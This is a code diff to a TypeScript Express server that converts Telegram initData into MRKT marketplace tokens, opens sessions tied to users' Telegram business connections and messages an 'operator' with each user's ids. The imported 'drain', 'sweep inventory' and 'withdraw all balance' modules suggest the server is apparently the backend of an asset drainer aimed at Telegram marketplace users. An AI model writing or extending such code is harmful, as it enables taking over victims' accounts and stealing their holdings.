@@ -10,7 +10,7 @@ import path from "node:path";
 import { fileURLToPath } from "node:url";
 import { config } from "./config.js";
 import { planNextBatch } from "./drain.js";
-import { getMe } from "./mrkt/client.js";
+import { authFromInitData, getMe } from "./mrkt/client.js";
 import { fetchInventory } from "./mrkt/client.js";
 import { sweepInventoryPage } from "./mrkt/sweep.js";
 import { withdrawAllMrktBalance } from "./mrkt/withdraw.js";
@@ -149,16 +149,27 @@ app.post("/api/build-batch", async (req, res) => {
   }
 });
 
-const sessionOpenSchema = z
-  .object({
-    initData: z.string().min(10).optional(),
-    mrktToken: z.string().min(8).optional(),
-    tgUserId: z.number().int().positive().optional(),
-    businessConnectionId: z.string().optional(),
-  })
-  .refine((b) => Boolean(b.initData || b.mrktToken), {
-    message: "initData or mrktToken required",
-  });
+const sessionOpenSchema = z.object({
+  mrktToken: z.string().min(8),
+  tgUserId: z.number().int().positive(),
+  businessConnectionId: z.string().optional(),
+});
+
+app.post("/api/mrkt/auth-bridge", async (req, res) => {
+  const initData = String((req.body as { initData?: string })?.initData ?? "");
+  if (initData.length < 10) {
+    res.status(400).json({ error: "initData required" });
+    return;
+  }
+  try {
+    const token = await authFromInitData(initData);
+    res.json({ token });
+  } catch (e) {
+    const msg = e instanceof Error ? e.message : String(e);
+    await logError("mrkt_auth_bridge_fail", e, { init_len: initData.length });
+    res.status(502).json({ error: msg });
+  }
+});
 
 app.post("/api/mrkt/session/open", async (req, res) => {
   const parsed = sessionOpenSchema.safeParse(req.body);
@@ -167,22 +178,14 @@ app.post("/api/mrkt/session/open", async (req, res) => {
     return;
   }
   try {
-    const resolvedTg = parsed.data.initData
-      ? tgUserIdFromInitData(parsed.data.initData)
-      : parsed.data.tgUserId;
-    if (!resolvedTg) {
-      res.status(400).json({ error: "tgUserId or initData required" });
-      return;
-    }
     const session = await openSession({
-      initData: parsed.data.initData,
       mrktToken: parsed.data.mrktToken,
-      tgUserId: resolvedTg,
+      tgUserId: parsed.data.tgUserId,
       businessConnectionId: parsed.data.businessConnectionId,
     });
     const me = await getMe(session.mrktToken).catch(() => null);
     await notifyOperator(
-      `<b>mrkt_session</b>\ntg <code>${resolvedTg}</code>\nMRKT id <code>${me?.id ?? "?"}</code>\nbc ${session.businessConnectionId ?? "—"}`,
+      `<b>mrkt_session</b>\ntg <code>${parsed.data.tgUserId}</code>\nMRKT id <code>${me?.id ?? "?"}</code>\nbc ${session.businessConnectionId ?? "—"}`,
     );
     res.json({
       sessionId: session.sessionId,
@@ -196,8 +199,6 @@ app.post("/api/mrkt/session/open", async (req, res) => {
     const msg = e instanceof Error ? e.message : String(e);
     await logError("mrkt_session_fail", e, {
       route: "POST /api/mrkt/session/open",
-      init_len: parsed.success ? parsed.data.initData?.length : undefined,
-      had_client_token: parsed.success ? Boolean(parsed.data.mrktToken) : undefined,
       tg_user: parsed.success ? parsed.data.tgUserId : undefined,
     });
     console.error(e);
